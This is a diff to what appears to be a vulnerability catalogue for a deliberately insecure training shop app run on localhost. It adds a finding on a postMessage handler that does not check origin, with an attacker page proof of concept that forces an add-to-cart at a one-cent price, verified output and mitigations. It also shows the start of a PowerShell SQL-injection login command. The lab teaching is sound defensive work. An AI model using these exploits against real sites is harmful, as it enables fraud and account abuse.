@@ -626,8 +626,55 @@ V-SHOP-122  No rate limit / no anomaly detection
 
 
 -----------------------------------------------------------------
-EXPLOIT QUICK-REFERENCE (PowerShell 5.1)
+CLIENT-SIDE / MODERN FRONTEND  (Ch 37)
 -----------------------------------------------------------------
+
+V-SHOP-123  window.postMessage handler does not check event.origin
+  Location:  views/partials/footer.ejs (inline script registers a
+             `message` listener that trusts e.data unconditionally).
+  Behaviour: data.action == 'add_to_cart'  -> POST /cart/add with
+                                              attacker-chosen
+                                              product_id, qty,
+                                              price_cents and the
+                                              victim's session cookie.
+             data.action == 'navigate'    -> location.href = data.url
+                                              (open redirect, can
+                                               include javascript:
+                                               URI on some browsers).
+  Exploit:
+     <!-- attacker.html, served from any origin -->
+     <iframe id="v" src="http://localhost:3002/products/1"></iframe>
+     <script>
+       document.getElementById('v').onload = () => {
+         document.getElementById('v').contentWindow.postMessage(
+           JSON.stringify({action:'add_to_cart', product_id:1,
+                            qty:99, price_cents:1}),
+           '*');
+       };
+     </script>
+     # Verified via jsdom (window.fetch captured):
+     #   {"u":"/cart/add",
+     #    "body":"product_id=1&qty=99&price_cents=1",
+     #    "creds":"include"}
+  Mitigation:
+     - First line of the handler: `if (e.origin !== EXPECTED_ORIGIN) return;`
+       and validate `e.source` is the iframe you created.
+     - Treat `e.data` as untrusted: JSON-parse inside try/catch, then
+       schema-validate against an allow-list of action types.
+     - For nested iframes, prefer `MessageChannel` so each side talks
+       only to a port it was explicitly handed.
+     - Add `X-Frame-Options: SAMEORIGIN` (or `frame-ancestors 'self'`
+       in CSP) so /products/* cannot be framed by attacker pages
+       even if the handler itself is fixed.
+
+V-SHOP-124  See also V-SHOP-075/076: source map + bundle secret
+  Note:      These two existing findings belong in Ch 37 as well --
+             they are the modern-frontend supply-of-information
+             pattern (source maps shipped to prod, secrets baked
+             into JS bundles).  No new lab change required.
+
+
+-----------------------------------------------------------------\nEXPLOIT QUICK-REFERENCE (PowerShell 5.1)\n-----------------------------------------------------------------
 
   # SQLi login
   Invoke-WebRequest -UseBasicParsing http://127.0.0.1:3002/auth/login `
